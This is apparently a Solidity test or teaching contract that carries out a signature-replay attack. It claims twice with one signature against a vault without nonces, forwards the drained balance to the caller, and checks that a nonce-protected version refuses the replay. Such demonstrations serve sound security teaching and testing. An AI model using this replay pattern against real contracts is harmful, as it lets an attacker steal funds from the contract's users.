// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVulnerableSignatureVault {
    function claim(address payable recipient, uint256 amount, uint256 deadline, bytes calldata signature) external;
}

interface IFixedSignatureVault {
    function claim(
        address payable recipient,
        uint256 amount,
        uint256 deadline,
        uint256 nonce,
        bytes calldata signature
    ) external;
}

contract SignatureReplayAttacker {
    function attackVulnerable(address vault, uint256 amount, uint256 deadline, bytes calldata signature) external {
        IVulnerableSignatureVault(vault).claim(payable(address(this)), amount, deadline, signature);
        IVulnerableSignatureVault(vault).claim(payable(address(this)), amount, deadline, signature);

        (bool ok,) = msg.sender.call{value: address(this).balance}("");
        require(ok, "PAYOUT_FAILED");
    }

    function attackFixed(
        address vault,
        uint256 amount,
        uint256 deadline,
        uint256 nonce,
        bytes calldata signature
    ) external returns (bool secondCallSucceeded) {
        IFixedSignatureVault(vault).claim(payable(address(this)), amount, deadline, nonce, signature);

        try IFixedSignatureVault(vault).claim(payable(address(this)), amount, deadline, nonce, signature) {
            secondCallSucceeded = true;
        } catch {
            secondCallSucceeded = false;
        }

        (bool ok,) = msg.sender.call{value: address(this).balance}("");
        require(ok, "PAYOUT_FAILED");
    }

    receive() external payable {}
}